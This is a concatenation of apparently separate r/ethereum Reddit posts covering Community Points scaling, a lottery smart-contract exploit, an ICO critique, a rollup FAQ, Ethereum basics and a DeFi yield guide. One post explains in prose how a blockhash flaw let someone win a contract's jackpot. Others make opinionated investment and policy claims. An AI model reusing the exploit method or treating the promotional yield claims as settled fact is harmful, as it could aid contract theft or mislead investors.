involved go offline* A public, third-party review attesting to the soundness of the design should be available* Bonus points:   * Public, third-party implementation review available or in progress   * Compatibility with HSMs & hardware wallets**Other Considerations*** Minting/distributing tokens is not performed by Reddit directly '[1']* One off point burning, as well as recurring, non-interactive point burning (for subreddit memberships '[2']) should be possible and scalable* Fully open-source solutions are strongly preferred'[1'] In the current implementation, Reddit provides signed data for claims, but does not submit the actual claim transaction for the user (the user does that themselves). Note that smart contracts are considered independent of Reddit provided there is a path to decentralizing control over them.'[2'] Subreddit memberships are currently implemented as a contract acting as an ERC777-style operator that can burn points on a monthly basis, but we are open to changing that implementation.# Community Points OverviewTo help you get started, this is an overview of how [Community Points](https://www.reddit.com/community-points/) work today and some stats on how it's used.

The hacker could withdraw 400 ETH before the owners, who wrote the successful hacker keeps ALL of the 1500 ETH reward, withdrew quickly the remaining 1100 ETH, that happened 5min before the next transaction (from the hacker) would have emptied the whole contract. So that's already a lie from their side. The other point is that the owners were able to withdrew ALL contract funds; which in theory they could have done after ICO and run with all the investor money. They always remained anon, which also shows there weren't good intentions in first place. How did it happen? Their lottery functions were flawed, if you place a bet (systemPlay() function) with betting on number value 0 and then call the won() function after 256+ blocks (after you placed the bet) the returning value will be 0 so you would have bet on 000000 and result would be 000000 and baaam you have the jackpot. The lucky guys first bet was 1 so 000001 and result after 256+ blocks calling won() would be 000000 so he matched 5 correctly which is 20000x and with 0.01ETH bet amount a win of 200ETH. He managed to pull that 2 time and corrected to 0 and for that transaction he had to wait for 256+ blocks, but 5 min before he could call won() the owners withdraw all funds. Moral of the story, that ICO was a scam seeing the owners remains anon all the time AND were able to withdraw all contract funds (doing that after ICO would have been fatal for investors). They thought they are clever, building a honeypot for investors but at the end their poor coded contract caused them damage of 400ETH and no damage to potential investors.

You can not actually *withdraw, ie transfer the coin to an outside wallet*, until 6 days. Moonpay didn't work, wyre didn't work, tried so many onramps. Your mileage may vary.

The individual that could potentially hold these unchecked powers is none other than the U.S. Secretary of the Treasury Janet Yellen. The very individual who has be opposed of the crypto market since her confirmation, this is also the same individual who had the brilliant idea to look into bank accounts for possible tax evasion.It doesn't just stop there, this would allow Yellen to employ what is called the ' Bank Secrecy Act' to require certain financial institutions to report information around transactions potentially connected to money laundering, as well as prohibit them from serving account holders with such alleged ties to illicit funds. While the act isn't something new it would go against the essence of what Defi stands for. While on paper this can be limited to those are under suspicion of money laundering and illicit fund activity we all know how quick this can be used to cover more users and account holders. This can be dangerous considering Yellen would have unilateral power over this sector.Crypto means something different to every individual in communities like r/ethereum to some a hedge against the current inflation, a means to increase personal wealth, monetary freedom and anonymity, whatever the reason is we are all in this together.This post is not to spread FUD or to get people to sell in order to give me a better buying opportunity.

I have a background in software engineering and masters in statistics and used that knowledge in the fun world of open-source crypto and Etherum :P Unfortunately, it only gets around 3 MH/s on my Xbox Series S right now.

If people help me increase the MH/s to make this really usable as a miner, I'll create a downloadable, easy to install Xbox miner. I made this as a Proof of Concept to get around all the hardware (Xbox, PS5 etc.) that is not user-configurable and is actively anti-crypto. Since the POC is done, I don't have major plans on making the miner better and easy to use, but I did put my ether wallet up on the github page.

Thus, the coins keep coming, but they generally don't add any real utility.MakerDAO ~~and EtherDelta are~~ is the only project I can think of that provide real use-cases *today* and used an ICO to get there. When I asked the community for more examples, [the response was not encouraging](https://www.reddit.com/r/ethereum/comments/80bvc0/what_are_some_useful_dapps_that_work_today_are/).On the other hand, consider dapps like CryptoKitties, Gitcoin, and Toastycoin, all of which launched without an ICO.- CryptoKitties truly broke new ground, giving every Ethereum user access to a genre of entertainment we don't even have a name for yet--some bizarre marriage of day-trading and beanie babies. For the first time, I was able to show people in the real world a working dapp that was *fun*, to the point where they downloaded MetaMask and put some ether on it. That's a pretty big deal.- Gitcoin has created a two-sided market out of nowhere, allowing developers and freelancers in OSS to accelerate projects and make money, respectively. Again, Ethereum users now have access to a new, useful economic tool that didn't exist before. It represents a huge step forward in solving the funding problem of open source development.- Toastycoin (full disclosure: my project) used novel game theory to outsource arbitrary tasks to reliable strangers while dissuading scammers, all automatically. The Ethereum ecosystem now has access to a generalized, unscammable task outsourcing mechanism, which has been proven to work and is unhindered by licensing restrictions.How many 'game coin' ICOs have we seen? And yet it was CryptoKitties alone that was so fun it clogged Ethereum *for a week*. How many ICOs talk about service marketplaces? And yet gitcoin is quietly listing [25 open tasks](https://gitcoin.co/explorer?q=) just waiting for developers to claim them (edit: and over 100 finished tasks!), and Toastycoin generalizes the idea further to apply to any small task one human could perform for another.Even better: none of these products require the user to go buy some shit coin on some random exchange they've never heard of. They just need ether and MetaMask, and they've got virtual kitties. Boom.ICOs are not effective vehicles for innovation, and don't deserve the focus we've been giving them.

Here, I'll address some of these myths and misconceptions to the best of my knowledge. Feel free to ask more questions, I'll edit them in. Also, please correct me if I get something wrong.I believe a lot of misconceptions are because people are stuck with the old monolithic blockchain ways where it is assumed that there's only one way to do things, and that is that one blockchain will do everything. So, let's begin with that, and also, thanks to r/ethfinance users for contributing these misconceptions.**Addendum**: Now that this post is pinned, I'm adding a couple of links so you can learn what rollups are. This is how Ethereum & the wider blockchain industry will scale.[An Incomplete Guide to Rollups (vitalik.ca)](https://vitalik.ca/general/2021/01/05/rollup.html)[https://www.youtube.com/watch?v=7pWxCklcNsU](https://www.youtube.com/watch?v=7pWxCklcNsU&t=1s)Updated on 14th October 2021. # Rollups are a temporary band aid fix - X, Y, Z blockchain can do it on L1 so they don't need rollups(by u/hehechibby, u/ec265)Rollups are the present and future of the blockchain industry.But first, a brief perspective shift is required to understand why rollups are essential. Until now, blockchains have had to do it all - execution, consensus/security and data availability. This has led to significant bottlenecks and inefficiencies, reflected in the blockchain trilemma. Rollups are blockchains that are laser focused on one thing, and one thing exclusively: executing transactions as fast as possible, while 'outsourcing' the hard work of security and data availability to a different L1 chain that is better at it. It's simple division of labour or specialization in action. Just like it led exponential growth in the industrial revolution, so will it lead exponential increase in scalability for the blockchain industry.Now, X, Y, Z blockchain may have compromised significant amounts of decentralization and security to get high scalability, and Ethereum and Bitcoin may have compromised scalability to get high security and decentralization. Rollups are simply constructions that can get the best of all worlds - with high scalability, security, *and* decentralization.The important point is that it doesn't matter if it's an L1 or a rollup - to the user they are just interacting with an execution layer. **Execution layers - L1s and rollups - should be directly compared with each other.** Solana and Avalanche are not competing with Ethereum - they are competing with Arbitrum One and StarkNet. '[Unless they pivot to a rollup-centric roadmap focusing on security and data availability, rather than execution - like Ethereum and Tezos have.']**Tl;dr: Whatever any L1 execution layer can do, a rollup can do it better.**# X, Y, Z blockchain is still faster than rollups[No.](https://www.reddit.com/r/ethfinance/comments/pk57n7/why_rollups_data_shards_are_the_only_sustainable/) Once again, whatever any L1 can do, a rollup can do it better long term. I'll point out that there's a wide-open design space with rollups, and some rollups will opt to have conservative rate limits - especially optimistic rollups. But with zkRs, they don't *have* to - they can push past the limits of L1s as described in the article linked above.# Lack of composability is bad(by u/Whovillage)This is a common argument about rollups but it actually makes very little sense. As mentioned twice already, whatever any L1 can do, a rollup can do it better. I don't see anyone complaining about lack of composability between L1s?A rollup remains fully composable, even if it's settled across multiple data shards or external data availability sources.Like L1s are not composable with each other, so are rollups not composable with each other. But there are many interoperability solutions live like Hop, Connext, cBridge and Biconomy, and many more in the works. Indeed, there's amazing innovations [like dAMM that lets multiple zkRollups share liquidity](https://medium.com/starkware/damm-decentralized-amm-59b329fb4cc3)! In addition, eventually we can have internally sharded zk rollups which retain full synchronous composability - a feat nigh impossible on L1s. **Tl;dr: Rollup composability is superior to L1s.**# Fragmentation of liquidity is bad(by u/Beef_Lamborghinion)See above, all of the same applies. Rollups may not share liquidity, but neither do L1s. Except, unlike L1s, they actually can with innovations like dAMM!**Tl;dr: Rollup liquidity fragmentation is less than L1 fragmentation.**# Rollups are centralized(by u/Whovillage)All transaction data (in compressed form) and proofs are published on L1, which enable exiting a rollup directly from L1 even if the rollup itself is compromised. So, security and decentralization of rollups = security and decentralization of L1. Now, it's certainly true that rollups [may have centralized controls in the early days](https://www.reddit.com/r/ethfinance/comments/nl9cum/early_rollup_training_wheels/), but most if not all rollup projects are committed to progressive decentralization. The final form of rollups: zk rollups with decentralized sequencers, decentralized provers, decentralized L1 smart contracts and light unassisted exits - **you have security and decentralization that's practically identical to the most secure and decentralized security layer (currently Ethereum), except with the massive scalability**.# Casual users will never be able to execute the CEX - Ethereum mainnet - rollup journey / it's too expensive(by u/Whovillage, u/stevieraykatz)Top CEXs like OKEx, Huobi and Coinbase have committed to support withdrawals directly to (and deposits from) Arbitrum One and other rollups with very low fees. Bitfinex already supports withdrawals to Hermez.Meanwhile, going through Ethereum is not the only way into rollups. cBridge, for example, lets you enter Arbitrum One through Optimism, Polygon PoS, Binance Smart Chain, xDai, Avalanche or Fantom. So, there are plenty of options already, and there'll be many more over time as CEXs and fiat ramps integrate, and liquidity builds up for these various solutions. Argent is releasing with direct fiat on-ramps to zkSync and other rollups soon. With account abstraction, innovative fee models, and meta-transactions - the user experience can actually be better. We can already see this on dYdX - all gas is abstracted from the user. All the user sees is instant transactions without ever having to worry about gas - a UX better than any L1. **Tl;dr: The UX is better than any L1.** # It takes too long to withdraw from rollupsThis is true for optimistic rollups - take 7 days to withdraw from rollup to L1 using the default bridge. However, as mentioned above, there are multiple options available that let you make a fast withdrawal for fungible assets. Of course, zkRollups don't have this limitation. For NFTs, zkRs are thus a preferred solution. # Rollups will be obsolete after 'Eth 2.0'Firstly, ['Eth2' is deprecated nomenclature](https://notes.ethereum.org/@timbeiko/great-renaming). The two major upgrades coming to Ethereum next are The Merge which merges the consensus layer (previously eth2) with the execution layer (previously eth1) - so we're all one Ethereum again! The next major upgrade after that is data sharding on the consensus layer side. Data sharding is actually focused on accelerating rollups. So, Ethereum L1 scalability will be limited for the foreseeable future, while rollups will scale through the roof!**Tl;dr: Ethereum's roadmap is rollup-centric and designed to accelerate and empower rollups.**# Rollups are still too expensiveThis is true, in the short term. Optimistic rollups like Arbitrum One and Optimistic Ethereum are reducing fees by 90%-95% currently, which while a huge improvement over Ethereum is still too expensive. With some optimizations like signature aggregation, better batching and calldata compression, this can be reduced to 99%. Indeed, zkRollups are already seeing 99% reductions getting fees down to the $0.10-$1 range even when L1 fees are high. dYdX is already doing transaction fees in the '~$0.10 for complex DeFi derivative trades - although this is abstracted away from the end users to be gas-free. But it doesn't stop here! When Ethereum releases data shards, rollup costs will absolutely plummet, with over a magnitude greater capacity unlocked overnight, scaling up to several orders of magnitude long term.You can get a preview of that with validiums like Immutable X, where it costs less than a cent to mint an NFT. Indeed, it's so cheap that Immutable X is subsidizing it, so it currently costs $0.00 to mint an NFT with your Ethereum wallet! [Try it out for yourself on SwiftMint](https://swiftmint.io/). I'll note that validiums are not as secure as rollups, but they are more secure than sidechains and other L1s. Volitions further extend this by giving users the choice between rollup and validium - best of all worlds!**Tl;dr: In the long term, rollups + data shards will offer the greatest scale and lowest fees possible for given demand.**# Rollup finality is slowRollup sequencers give you 'soft confirmations' nearly instantly - for me this is '~0.3 seconds on average for a Uniswap trade on Arbitrum or Optimism. For most people, this soft confirmation is fine. But it's true that L1 finality is often delayed, especially in the case of zkRs. StarkNet has a great solution [with checkpoints achieving effective finality](https://ethresear.ch/t/checkpoints-for-faster-finality-in-starknet/9633) on the rollup side very quickly, at which point the finality is as fast as the L1 can finalize. As zk tech improves, Ethereum implements single-slot finality and data shards are staggered, we will see finality drop to a few seconds. You can also have a consensus mechanism on a rollup that finalizes fast - just like any L1 would - so you get the same experience, but additional security. But this gives up efficiencies gained from being a rollup. All that said, there may be some niche usecases where settling directly on L1 still makes sense without bolstering security - but this is a very small niche.# Rollups are an Ethereum thing and bound by EVM and SolidityRollups are definitely not just an Ethereum thing. Indeed, [Tezos is embracing](https://www.youtube.com/watch?v=oqBSs0DSuzQ) a rollup-centric roadmap. Arthur Breitman, founder of Tezos, actually makes one of the best arguments for why rollups are the ultimate scalability solution, in tandem with data shards. [NEAR is also designing for sharded data availability](https://twitter.com/ilblackdragon/status/1437323779420696578). Celestia is building a security & DA layer exclusively for rollups. Further, rollups have a wide open design space. They can experiment with VMs, fee models, coordination mechanisms, governance etc. Indeed, the room for innovation is much wider than L1s - given they always have a fallback on the most secure L1. Want a quantum-resistant VM? Use StarkNet. Like your UTXOs? Use Fuel V2. Like LLVM and Rust? Use zkSync 2.0. Just want a chain optimized for one specific application? Sure, use Immutable X for NFTs. Want a fully private chain: use Aztec. WASM? Arbitrum. Any VM, any programming language, any data model - a rollup can do it all. Indeed, it can innovate beyond any L1 with clever fee & tokenomics models (see: Immutable X's IMX token), governance structures, etc. **Tl;dr: Rollups have a wide-open design space, and anything any L1 can do, so can rollups, and then some.**# Why is Ethereum special, if you can deploy rollups elsewhere?Rollups will leverage whatever is the most secure and decentralized L1 with the highest data availability that can support it.It's clear Ethereum is orders of magnitude more secure and decentralized than any smart contract platform. Realistically, Bitcoin is the only other chain that's comparable, but of course, they lack the ability to host rollups.Ethereum doesn't currently have the highest data availability, but it will, with data sharding. Meanwhile, we have validiums offering ample data availability with security that's still superior to other L1s. Data sharding inverts the trilemma - the more decentralized your network is, the more data shards you can deploy, and the more scalable your rollups will be. This is how rollups that deploy on Ethereum will scale to millions of TPS over the years, [speculatively up to 15 million TPS by 2030](https://www.reddit.com/r/ethfinance/comments/ojafms/conjecture_how_far_can_rollups_data_shards_scale/). The only area where Ethereum can be improved is the execution layer - to make it more friendly for verifying zk-SN(T)ARKs. I'm sure it will, once The Merge, data shards and statelessness are done.It's clear, then, that Ethereum is uniquely positioned to be the best host for rollups. But this is not to say that there can't be other contenders. If Ethereum's data shards are saturated, we'll see data availability chains like Celestia or Avail potentially taking up the slack. Other L1s who are embracing a rollup-centric model, like Tezos, may also benefit if there's an overflow of demand from Ethereum-based rollups. And of course, the elephant in the room is an unexpected new competitor, though realistically, the only real competitor is if Bitcoin somehow adds the functionality to verify zk-SNARKs and implements data sharding.For the rollups, it doesn't really matter. They'll just leverage whatever L1 offers them the best security, decentralization, network effect and data availability.**Tl;dr: Ethereum is uniquely positioned to offer the highest security, decentralization, and data availability - making it the defacto standard host for rollups.**# Rollups are stealing traffic from EthereumEthereum execution is fully saturated, and has had full blocks for years now. All activity on rollups is net additive. Now, some may argue sharding would have expanded Ethereum's capacity - but rollups + data shards in tandem increase the overall capacity of the Ethereum ecosystem by several orders of magnitude more than the previous sharding solution.# Rollups are too complicated, no one will understand itMight I just point out I'm writing this on the day that Arbitrum One has proven to be the fastest growing smart contract platform in history? In reality, the UX for using a rollup is identical to that of using an L1, as covered before. Users need not care about the underlying architecture - to them it's just another smart contract platform. Do YouTube users care about what programming language it was written in, what OS the servers run on, what hardware the servers implement, what internet connection they use etc.? Of course not. Indeed, [I expect things will improve significantly with smart contract wallets and centralized frontends](https://polynya.medium.com/a-vision-of-ethereum-2025-bb92a0d4dc4f).# When rollups get big enough they will just abandon the base chain and create their own blockchain(by u/Whovillage)Technically, this is possible. However, what makes a rollup special is that it's backed by the most secure and decentralized L1. This is the hardest bit, evidently so as only Bitcoin and Ethereum have managed to achieve it. Arbitrum One has already demonstrated that there's exponentially more demand for a chain backed by Ethereum's security than a more centralized consensus mechanism. On a related note, as alluded to earlier, if there's a competitor that offers better security and data availability than Ethereum, then rollups will be well incentivized to migrate. Which is fine, and will keep Ethereum core researchers and developers honest.# There are no rollup tokens, so people won't be invested in the ecosystemsThis is not quite true. While there are many rollup projects in their early stage and do not yet have a token, I expect most rollups to eventually release a token. Many rollup projects do have tokens, and are using them in innovative ways - like Immutable X. Just another advantage for rollups over L1s - you can have unique and clever token and fee models.# It's too expensive to compute a zero-knowledge proofTrue, but by amortizing this over many transactions, the costs become negligible relative to gas paid for transaction calldata. Of course, we're still in the early days of zero-knowledge tech, and we'll see costs and time for computing zk proofs plummet over time. Software optimizations, GPU/FPGAs/ASICs, Moore's Law, and growing adoption with more transactions means things will only get better for zkRollups, which have already proved to be sustainable.# Can NFTs transfer easily between L1 and rollups and between rollups?(by u/Datacruncha)This is a great question that I had overlooked. While there are multiple bridges for fungible tokens, as mentioned above, NFTs are more complicated because you can't have liquidity bridges. Currently, yes, you can transfer NFTs between L1s and rollups, but the solutions are definitely early workarounds. For example, on zkSync 1.x, you can mint an NFT there, and when you withdraw to L1, it's simply burned on zkSync 1.x and minted as an ERC-721 on L1. Cross-rollup is definitely an unresolved problem. Fortunately, this is being actively researched, and there's a lot of discussion on a [recent wrapped NFTs proposal by Vitalik](https://ethresear.ch/t/cross-rollup-nft-wrapper-and-migration-ideas/10507) to make NFTs easily transferable cross rollups. Jordi Baylina from Polygon Hermez [further expands upon it](https://ethresear.ch/t/cross-rollup-nft-wrapper-and-migration-ideas/10507/28) but really there are many insightful comments in that thread (and some low-quality trolling too!).# You're talking about the future, execution risks remainThis is absolutely true. Rollups are nascent technology, and [it'll take a couple of years to mature](https://www.reddit.com/r/ethfinance/comments/paipgj/why_the_transition_to_rollupcentric_ethereum_is_a/) and live up to their potential.

This change is by far the biggest and most fundamental change that the Ethereum roadmap has ever seen. Ethereum L1's role has evolved a lot and it now aims at becoming a settlement layer for rollups. Ethereum is no longer focused on being a smart contract platform, but rather, a platform to build smart contract platforms on top of. This starts with The Merge, which will merge the execution layer (previously eth1) and consensus layer (previously eth2), and continue with the release of data shards. The entire roadmap now entirely revolves around the idea that rollups are THE way through which Ethereum will be used by billions.It's not true anymore that *'Ethereum 2.0 will soon bring fees down'*, rollups will!

Some of these are my own opinion, some definitely require more context to understand properly (again, happy to elaborate) but the goal is to quickly summarize all the different stuff that gets brought up over and over.Anyway yeah, if you're invested in Ethereum, or at the very least interested in it enough to be browsing this sub (why else would you be here lol) then you should be aware of the following:1. Ethereum is the network, Ether is the currency. And there is no 'I' anywhere in the name.2. [Fees are high](https://cryptofees.info/) because that's how much the market values Ethereum's limited blockspace. It's purely supply and demand.    * Fees scale with [how much computation is being executed](https://docs.ethhub.io/using-ethereum/transactions/), not how much money is being handled. It costs $5 on average to send any amount of Ether, whether it's $1's worth or $1 million's. It costs much more to do swaps and mint NFTs and such because those operations require more computation.    * There is no way for anyone to artificially keep fees high unless they're willing to [literally burn millions of dollars per day for no reason](https://watchtheburn.com/).3. Ethereum's blockspace is limited because letting people run nodes themselves on average consumer hardware is important for decentralization.    * Decentralization is a spectrum and has many meanings from protocol specification, protocol implementation, node distribution, coin distribution, censorship resistance, permissionlessness, etc.    * Pointing at one aspect to scream 'centralized' isn't clever nor helpful. Chances are the aspect you point out is known and is an active area of research with a concrete plan on [the roadmap](https://i.imgur.com/vXMaIyZ.png) to address it and increase decentralization some more.    * No blockchain is ever fully decentralized, especially not from the start – and Ethereum's end goal is to be able to run without a hiccup for *decades* if not *centuries*. At 6.5 years old, it's still very young.    * If you care about decentralization, invest in and contribute to projects like Ethereum who view it as a goal, not a crutch that 'nobody cares about it that much anyway, let's just [increase the gas limit](https://github.com/binance-chain/bsc/issues/553) to have low fees asap'4. There is a [vast difference](https://ethereum.org/en/developers/docs/nodes-and-clients/#node-types) between an 'archive node' (several TBs) and a 'full node' (hundreds of GBs)    * Running an archive node is not necessary to sync from genesis and verify blocks and transactions.    * A full node has all the information enough to generate an archive node.    * There are plans on [the roadmap](https://i.imgur.com/vXMaIyZ.png) to reduce the storage/bandwidth/RAM requirements of nodes even more, to a point where a smartphone will be able to independently verify and propagate new blocks. 5. There is no 'when eth2 rolls out' or 'when devs release eth2' or god forbid 'when ethereum is upgraded to 2.0'. What there is instead is a roadmap consisting of a series of upgrades aiming to help rollups – *not the base layer* – scale to hundreds of thousands of TPS.    * Depending on context, Eth1 is usually synonymous with 'execution layer' and Eth2 usually means 'consensus layers' ([helpful illustration](https://i.imgur.com/AHHcUgm.png)) otherwise 'eth2' is an umbrella term for the set of upgrades over a long period of time, but the fact remains that there is no specific instant in time where 'eth1 turns into eth2'.    * Similarly, there is no 'eth2' coin. ETH is ETH, you don't have to do anything, the coins you hold today will be the same after the switch to proof of stake.6. Unlocking staked Ether [will not cause a mass sell-off event](https://twitter.com/domothy/status/1467387422765953029). There is a limited withdrawing queue, it's not gonna happen all at once. And there are many more reasons for more people to start staking Ether than there are for the current stakers to exit en masse.    * Also, unlocking staked Ether will not be possible directly after the merge. Withdrawals will be enable in the first fork that follows the merge ~6 months later.7. There are plenty of options to avoid high gas fees, it's perfectly fine to use a sidechain to do your DeFi stuff for now. I use sidechains myself too. Just don't pretend these sidechains will replace Ethereum in any significant way as that's not even what they're trying to do.8. Switching to Proof of Stake [will not lower Layer 1 gas fees significantly](https://willthemergelowergasprices.org/). Anyone saying otherwise is either misinformed or trying to mislead you into false expectations to bank on the inevitable mass disappointment following the merge.    * It's still a monumental upgrade that will render possible much-needed upgrades like light clients, statelessness, and sharding, etc. that would otherwise be impossible or impractical to implement on the current proof of work chain.    * It's basically a way to 'start from scratch' while keeping the same coin, same users, same dapps, same network effects.    * PoS has been on the roadmap [since day 1](https://blog.ethereum.org/2015/03/03/ethereum-launch-process/). Yes, estimates of PoS dates have been wrong before. However right now it's all hands on deck on the merge, the spec is done, the beacon chain is running, there is a [merge testnet running](https://blog.ethereum.org/2021/12/20/kintsugi-merge-testnet/), it's happening.9. Sharding will not lower Layer 1 gas fees significantly either. Sharding is all about *data*, execution on Layer 1 will still be limited and expensive. What data sharding will do is help rollups (Layer 2) scale by several orders of magnitude.10. [Rollups](https://mirror.xyz/ethmaxitard.eth/iyCAlOexgQKOvoSAAk4utYGEdnESOKb5HstM2_LaqL4) are [already live today](https://l2beat.com/) and they will only [get cheaper](https://l2fees.info/) as more people use them.11. [Data sharding + rollups is the only sustainable way](https://www.reddit.com/r/ethfinance/comments/pk57n7/why_rollups_data_shards_are_the_only_sustainable/) to scale a blockchain globally without compromising decentralization.    * 'Sustainable' as in the overall security model doesn't rely on hoping that the coin's price will pump forever to outpace the dilution from the blockchain issuing way more new coins than they collect in fees. Something that all major blockchains (including Ethereum most days, and even Bitcoin) are currently doing.    * 'Without compromising decentralization' as in more decentralization = more data for rollups = more scaling (lower individual fees on L2). Decentralization becomes an integral part of the scaling equation rather than a crutch.    * [The rollup-centric roadmap](https://ethereum-magicians.org/t/a-rollup-centric-ethereum-roadmap/4698) is all about admitting that no single blockchain can do it all by itself and can't compete with what rollups can do. In other words, 'Ethereum maximalism' amounts to helping independent teams develop rollups, innovate and compete with each other on top of Ethereum's secure, decentralized, and open platform.    * The true competition of sidechains is rollups, not Ethereum itself.     * All the criticisms of a multi-rollup world apply to the current multi-chain world model as well. Except they apply way more to the multi-chain world and can be overcome way more easily in a multi-rollup world.    * A rollup can settle on any L1, sure, but it's gonna gravitate towards the most secure, most decentralized and most credibly neutral settlement layer with the best data availability. Right now only Bitcoin and Ethereum fit those criteria (other L1s optimize for fast execution, not secure data availability) and Bitcoin would need a hard fork to implement rollup-friendly functions, so that only leaves Ethereum as the poised ['AWS for blockchain'](https://twitter.com/domothy/status/1465905887541972996).12. Ether isn't meant to be a day-to-day currency that will replace fiat. The use-case of Ether isn't to pay for bread and milk, it's to pay for gas fees and secure the network. All the other use-cases derive from Ether's scarcity, but they're not strictly necessary.    * Having Ether be an appreciating asset is good for the overall long-term health of the network by providing it with more [economic security, its holders more economic bandwidth](https://i.imgur.com/AErfdod.png), and its users more reasons to hold/stake. The incoming deflation is good.    * However, the supply is not gonna be deflationary forever. The market dictates how much the blockspace is worth (so how much gets burned) and it also dictates how much the staking APR should be (so how much gets printed) so these two opposing forces will meet in the middle at some point. It's all about [them feedback loops](https://i.imgur.com/3bPV35a.png).13. The security model trumps the economic model. The core idea behind the economic model is: '[Minimum viable issuance to secure the network](https://www.reddit.com/r/ethfinance/comments/izhkvk/minimum_viable_issuance_why_ethereums_lack_of_a/)'. It was designed from the start to be [disinflationary](https://blog.ethereum.org/2014/04/10/the-issuance-model-in-ethereum/) (as in, inflation % terms goes down over time) with even the idea of fee burning being mentioned in [early](https://blog.ethereum.org/2016/07/27/inflation-transaction-fees-cryptocurrency-monetary-policy/) publications and [FAQ](https://github.com/ethereum/wiki/wiki/Proof-of-Stake-FAQ/ba766606790d80422b23650d3326e2d963bdfa87)14. It's okay to change or tweak things when new research indicates there's a problem with long-term sustainability or security of the current model. These changes don't happen 'on a whim of a few people', there's a lot of consideration that go into them.    * And remember, changes happen in a highly adversarial context. If there's *any* possibility of an upgrade causing security problems or being exploited in any way for profit, then it *will* happen. Changes don't just happen for fun 'just because', they happen when their benefits outweigh the inherent risks of potentially adding more complexity.15. The Ethereum Foundation is more of a [coordinator than a dictator](https://ethereum.foundation/philosophy/). It's much more of a community-focused bottom-up approach than the top-down structure people think.    * Everything happens extremely transparently on open forums that no one reads and [public livestream calls](https://www.youtube.com/c/EthereumFoundation/videos) that no one listens to. But everyone who wants to participate is welcome, it's all out in the open.    * The Ethereum Foundation doesn't code any of the actual software, client teams do. There are 5 major execution clients and 4 major consensus clients, developed by independent teams, to implement the protocol specification. This multi-client approach may be responsible for development delays, but it comes with [security benefits](https://www.reddit.com/r/ethereum/comments/mreacw/psa_the_importance_of_multiclient_and_why_the/)    * [Anyone can propose an Ethereum Improvement Proposal](https://ethereum.org/en/eips/). You just have to convince others it's a good idea to implement it (most EIPs don't get implemented and fall into obscurity) and the clients could just refuse to code it in if it's a very bad idea. The more time passes, the harder it becomes to push changes to the Ethereum protocol and everything converges to the status quo. (This doesn't close the door to further innovation however, as it's still an open platform on which anyone can build)    * Vitalik regularly gets his proposals blocked by client teams, other researchers, or the community in general. At most, he's a knowledgeable influence because he knows the tech and cryptography in depth and has been there from the beginning. It's silly to worship him, and it's silly to treat him as Ethereum's Zucc-like CEO. He's 'just some guy'.16. The '[DAO hard fork](https://eips.ethereum.org/EIPS/eip-779)' wasn't a roll-back. Not a single transaction was reverted, no one lost any funds other than the exploiter who could have otherwise gotten away with [15% of the total supply at the time](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). It wasn't a bailout of Vitalik and his pals, it was a bailout of a huge chunk of the community from an event that could have killed the whole thing in its infancy.     * In the end it's all social consensus, and the consensus from miners, users, developers was strong. Even 'code is law' is social consensus that [can get reverted in case of major bugs](https://en.bitcoin.it/wiki/Value_overflow_incident). It's all about what the community deems [legitimate](https://vitalik.ca/general/2021/03/23/legitimacy.html).    * *edit: see comments for more nuance on this point*17. As far as the [initial distribution](https://i.imgur.com/k3GB8Lh.png) goes, Ethereum's ICO is among [the best of those who had an ICO](https://i.imgur.com/fmW3ytf.png), and as far as the current distribution goes (after 6 years of proof of work and market movements), it's [on par with Bitcoin's](https://medium.com/@adamscochran/the-10k-audit-42c100dd32bb). 60m of the 72m 'pre-mined' coins went to a permissionless no-KYC sale, and [all the genesis transactions are included in Block #0](https://etherscan.io/txs?block=0) so you can check yourself that there's no hidden coins. Just like Bitcoin, early investors took on big risks and got big rewards. No surprises here. Any concerns of the ICO being a scam or rugpull should have vanished some time in 2015, yet here we are still talking about it for some reason.    * And if coin distribution is a concern to you because proof of stake, then you should be glad the DAO hack didn't end up with a single person owning 15% of the supply...    * *edit: see comments for more nuance on this point too lol*18. There is no 'technical debt' preventing Ethereum from scaling.19. EIP-1559 was [not meant to lower gas fees](https://web.archive.org/web/20210205013340/https://willeip1559lowergasprices.org/) and no credible person ever promised it was a scaling solution.    * It has [many benefits](https://domothy.com/eip1559/) beyond coin burning. The deflation is a nice side effect, and it's certainly not a gimmick meant to pump the price.20. Proof of Work is really just Proof of Stake with extra steps.    * In both systems, the goal is reach consensus in a sybil-resistant way. Spending time and energy by computing hashes over and over is just the easiest way to reach that goal. But if we can achieve that goal (randomness + verifiable delay functions) without using the energy of a continent, maybe we should look into it.    * In both systems, whoever has capital gets to earn more capital by producing more blocks. (Except in Proof of Stake, everyone earns at the same rate, proportional to how much they stake)    * In both systems, the capital that someone has at stake (mining rigs vs coins directly) is a good indicative that they will play by the rules.    * By design, [Ethereum doesn't have on-chain governance](https://docs.ethhub.io/ethereum-basics/governance/#on-chain-governance). This means that the people with the most coins can't change the rules under PoS any more than the people with the most hash rate can change the rules under PoW.    * Just like there are mining pools, there are staking pools. As usual, some options are [more decentralized and community-focused](https://rocketpool.net/) than others.",False,A collection of various things the average /r/ethereum browser should know about Ethereum,,69,1071,0.99,https://www.reddit.com/r/ethereum/comments/s8mnwb/a_collection_of_various_things_the_average/,[]

Despite being at its inception, with currently more than $40 billion in total value locked (TVL) '[1'], there exist already plenty of opportunities for you to make your idle crypto tokens do the hard work for you to earn some interest. Some of the strategies offer a high risk-reward ratio, whereas some are rather safer. Many people do not know where to start with DeFi because the term itself is a buzzword (e.g., similar to the term BigData) with ambiguous meanings that get people easily lost. DeFi encapsulates various decentralized financial services whose functionality is immutable and persisted on (Ethereum) blockchain, which simply means these services are *accessible to anyone under the same rules and conditions*, which is a huge difference from traditional financial (tradFi) services. DeFi offers various strategies and this extensive guide should outline and uncover the most common earning strategies—including advantages and disadvantages—in the Ethereum ecosystem. The strategies proceed from the more mainstream and community-approved ones to more advanced ones, concluding with inspiring platforms and trends.**CONTENTS**1. Staking   1. Staking ETH 2.0   2. Staking ERC-20 tokens2. Lending   1. Stablecoin lending   2. wETH and wBTC lending3. Liquidity providing4. Yield and reward farming5. Miscellaneous: yield-bearing NTF´s, synthetic assets, future yield markets, self-paying loans6. Links and resources**1 STAKING**This is not DeFi per se, but to make the list complete, I will start with this, as ETH 2.0 staking is the *most important strategy* that can not only grant you passive income but also helps *keep the network decentralized and safe*. Also, the rewards compared to traditional finance are very appealing.**1.1 ETH 2.0 staking**    rewards: ~8% APRThere has been written a lot about staking already, for those who are interested to read more, the best start is Etehreum official website '[2']. Several variants exist (self, validator-as-a-service, stake pools, custody, exchange) each of which suits better for people at different skill levels or involvement.|'[+'] Ultimate HODL strategy|'[-'] Tokens are locked 